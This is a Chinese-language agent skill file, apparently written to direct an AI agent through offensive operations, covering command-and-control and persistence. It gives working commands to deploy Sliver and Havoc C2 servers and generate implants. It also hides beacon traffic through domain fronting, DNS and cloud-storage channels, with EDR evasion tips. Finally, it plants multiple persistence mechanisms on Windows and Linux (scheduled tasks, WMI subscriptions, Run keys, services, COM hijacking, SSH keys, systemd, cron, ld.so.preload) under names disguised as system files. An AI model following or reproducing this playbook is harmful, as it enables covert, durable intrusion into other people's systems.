---
name: c2-persistence
description: C2 长期控制：Sliver/Havoc 服务端与植入体、流量伪装（域前置/CDN/malleable）、Beacon 管理、Windows/Linux 持久化全家桶（计划任务/WMI事件订阅/注册表/服务/SSH key）
whenToUse: 已拿到一台落地权限需要稳定回连通道；需要多阶段载荷与流量伪装避免回连被封锁；需要在重啩后仍保持访问
role: internal
enabled: true
---

# C2 与持久化（长控）

两部分:C2 通道(回连怎么不被封)与持久化(重啩后权限还在)。
**判定红线:目标机重啩后 implant 仍自动回连成功**(不是"当下在线")。

## 一、C2 服务端(VPS 上部署)

### Sliver(推荐,单二进制)
```bash
# VPS
curl -fsSL https://sliver.sh | bash        # 或下载 release
sliver-server
# 生成 implant
sliver > generate --http --c2-domain cdn.example.com --os windows --arch amd64 --save /tmp/
# 监听
sliver > http --lhost 0.0.0.0 --lport 443 --domain cdn.example.com --tls
```
- 多协议并行:http(s)/dns/mtls 各起一条,dns 备用(见下)

### Havoc(团队服务器,免杀友好)
```bash
./Havoc teamserver <VPS_IP> <password> --profile ./profiles/win.profile
```
- Demon 注入体默认睡眠混淆 + indirect syscall,过部分 EDR

## 二、流量伪装(不让回连 IP 被封)

### 域前置(Domain Fronting)
```bash
# 依托高信誉 CDN(Azure/Fastly/CloudFront)
# Sliver: --c2-domain 指向 CDN 上的合法域,真实解析到你的 VPS
# HTTP 层 Host 用合法大厂域,SNI 一致,防火墙看到的是访问 CDN
```
### mTLS 隐藏 + CDN 备链
- 主:443 mTLS(特征最低)
- 备:dns(通过 TXT/NULL 记录,慢但极难封)
- 备:云对象存储外带通道(S3/OSS bucket 当 C2 中转:implant GET/PUT 即通信)

### 回连节奏
- sleep ≥ 60s + 抖动(20%)
- 工作时间外自动静默(Beacon 内置)
- 每台目标机**独立域名/证书**,不要一串目标共用

## 三、Windows 持久化(按检测度排序)

```powershell
# 1. 计划任务(最常用,系统权限最稳)
schtasks /create /tn "OneDriveSync" /tr "C:\ProgramData\svchost32.exe" /sc onlogon /rl system /f
# 2. WMI 事件订阅(无文件,高级)
$Filter=([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
$Filter.Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime > 240"
# 3. 注册表 Run 键
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v OneDrive /d "C:\ProgramData\svchost32.exe" /f
# 4. 服务(自启动最稳)
sc create OneDriveSvc binPath= "C:\ProgramData\svchost32.exe" start= auto
# 5. COM 劫持(HKCU,无管理员)
reg add "HKCU\Software\Classes\CLSID\{...}" /ve /d "C:\ProgramData\x.dll"
```
- 多点布防:同机 ≥2 种(任务+服务),单一被清还有一条
- 载荷路径用系统级目录伪装名:\ProgramData\ 下 svchost32 / OneDriveUpdate

## 四、Linux 持久化

```bash
# 1. SSH 授权键(极简,优先)
echo '<pubkey>' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys
# 2. systemd 服务(重啩自拉)
[Unit]
Description=cloud-init helper
[Service]
ExecStart=/usr/local/bin/.h
Restart=always
[Install]
WantedBy=multi-user.target
# systemctl enable cloud-helper --now
# 3. cron @reboot
@reboot /usr/local/bin/.h >/dev/null 2>&1
# 4. 动态链接库预载(隐蔽)
echo /usr/local/lib/.p.so > /etc/ld.so.preload
```

## 五、Beacon 管理纪律
- 每台会话命名 = 靶标+网段(如 corp-web-10.3.0.5)
- 分级:落地机(挂横向)、跳板(挂隧道)、域控(只留 Golden,不跑重活)
- 出网封禁切换:一条通道断了自动切备链(dns/storage)

## 红线(完成判定)
- 重启目标机 → implant 在 5 分钟内自动回连(会话列表重新出现)
- 至少两种持久化机制并存且都能独立拉起
- C2 域名/证书/监听配置已入档 runs/c2-<target>.txt

## 衔接
- 植入前免杀 → evasion-defense-bypass
- 持久化后的横向 → ad-domain-attack / lateral-movement
- 隧道需求 → chisel-tunnel / frp-tunnel / suo5-tunnel
